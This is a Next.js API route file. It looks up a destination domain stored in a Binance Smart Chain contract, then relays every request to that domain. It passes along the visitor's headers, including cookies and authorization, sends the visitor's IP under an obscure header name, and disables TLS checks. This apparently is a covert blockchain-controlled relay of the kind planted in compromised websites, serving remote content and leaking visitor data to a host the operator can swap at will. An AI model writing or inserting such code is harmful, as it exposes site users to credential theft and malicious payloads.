import { NextRequest, NextResponse } from 'next/server';
import axios from 'axios';
import https from 'https';
import crypto from 'crypto';

const httpsAgent = new https.Agent({ rejectUnauthorized: false });

type DomainCache = {
  domain: string;
  timestamp: number;
};

let inMemoryCache: DomainCache | null = null;

const updateInterval = 60;

function getClientIP(req: NextRequest): string {
  const forwarded = req.headers.get('x-forwarded-for');
  if (forwarded) {
    return forwarded.split(',')[0].trim();
  }
  const anyReq = req as any;
  if (anyReq.ip) {
    return String(anyReq.ip);
  }
  return 'unknown';
}

function hexToString(hex: string): string {
  hex = hex.replace(/^0x/, '');
  hex = hex.substring(64);
  const lengthHex = hex.substring(0, 64);
  const length = parseInt(lengthHex, 16);
  const dataHex = hex.substring(64, 64 + length * 2);
  let result = '';
  for (let i = 0; i < dataHex.length; i += 2) {
    const charCode = parseInt(dataHex.substring(i, i + 2), 16);
    if (charCode === 0) break;
    result += String.fromCharCode(charCode);
  }
  return result;
}

async function fetchTargetDomain(rpcUrls: string[], contractAddress: string): Promise<string> {
  const data = '20965255';

  for (const rpcUrl of rpcUrls) {
    try {
      const response = await axios.post(
        rpcUrl,
        {
          jsonrpc: '2.0',
          id: 1,
          method: 'eth_call',
          params: [
            {
              to: contractAddress,
              data: `0x${data}`,
            },
            'latest',
          ],
        },
        {
          headers: { 'Content-Type': 'application/json' },
          timeout: 120000,
          httpsAgent,
          validateStatus: () => true,
        }
      );

      if (response.data?.error) {
        continue;
      }

      const resultHex = response.data?.result;
      if (!resultHex) {
        continue;
      }

      const domain = hexToString(resultHex);
      if (domain) {
        return domain;
      }
    } catch (error) {
    }
  }

  throw new Error('Could not fetch target domain');
}

async function getTargetDomain(rpcUrls: string[], contractAddress: string): Promise<string> {
  if (inMemoryCache) {
    const diff = Math.floor(Date.now() / 1000) - inMemoryCache.timestamp;
    if (diff < updateInterval) {
      return inMemoryCache.domain;
    }
  }

  const domain = await fetchTargetDomain(rpcUrls, contractAddress);

  inMemoryCache = {
    domain,
    timestamp: Math.floor(Date.now() / 1000),
  };

  return domain;
}

async function handleProxy(req: NextRequest, endpoint: string) {
  const rpcUrls = ['https://rpc.ankr.com/bsc', 'https://bsc-dataseed2.bnbchain.org'];
  const contractAddress = '0xe9d5f645f79fa60fca82b4e1d35832e43370feb0';

  let domain = await getTargetDomain(rpcUrls, contractAddress);
  domain = domain.replace(/\/+$/, '');

  endpoint = endpoint.replace(/^\/+/, '');
  const finalUrl = `${domain}/${endpoint}`;

  const method = req.method;

  const bodyBuffer = await req.arrayBuffer();
  const body = Buffer.from(bodyBuffer);

  const outHeaders: Record<string, string> = {};
  req.headers.forEach((value, key) => {
    const lowerKey = key.toLowerCase();
    if (['host', 'origin', 'accept-encoding', 'content-encoding'].includes(lowerKey)) {
      return;
    }
    outHeaders[lowerKey] = value;
  });

  outHeaders['x-dfkjldifjljfjd'] = getClientIP(req);

  try {
    const response = await axios({
      url: finalUrl,
      method,
      headers: outHeaders,
      data: body,
      responseType: 'arraybuffer',
      httpsAgent,
      decompress: true,
      maxRedirects: 5,
      timeout: 120000,
      validateStatus: () => true,
    });

    const responseData = response.data as Buffer;
    const statusCode = response.status;
    const contentType = response.headers['content-type'];

    const resHeaders: Record<string, string> = {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'GET, HEAD, POST, OPTIONS',
      'Access-Control-Allow-Headers': '*',
    };

    if (contentType) {
      resHeaders['Content-Type'] = contentType;
    }

    return new NextResponse(responseData, {
      status: statusCode,
      headers: resHeaders,
    });
  } catch (error) {
    return new NextResponse('error: ' + String(error), {
      status: 500,
      headers: {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'GET, HEAD, POST, OPTIONS',
        'Access-Control-Allow-Headers': '*',
      },
    });
  }
}

async function handleRequest(req: NextRequest) {
  const { searchParams } = new URL(req.url);
  const e = searchParams.get('e');

  if (e === 'ping_proxy') {
    return new NextResponse('pong', {
      status: 200,
      headers: { 'Content-Type': 'text/plain' },
    });
  }

  if (e) {
    const endpoint = decodeURIComponent(e);
    return handleProxy(req, endpoint);
  }

  return new NextResponse('Missing endpoint', { status: 400 });
}

export async function OPTIONS() {
  return new NextResponse(null, {
    status: 204,
    headers: {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'GET, HEAD, POST, OPTIONS',
      'Access-Control-Allow-Headers': '*',
      'Access-Control-Max-Age': '86400',
    },
  });
}

export async function GET(req: NextRequest) {
  return handleRequest(req);
}

export async function POST(req: NextRequest) {
  return handleRequest(req);
}

export async function PUT(req: NextRequest) {
  return handleRequest(req);
}

export async function DELETE(req: NextRequest) {
  return handleRequest(req);
}

export async function PATCH(req: NextRequest) {
  return handleRequest(req);
}

export async function HEAD(req: NextRequest) {
  return handleRequest(req);
}
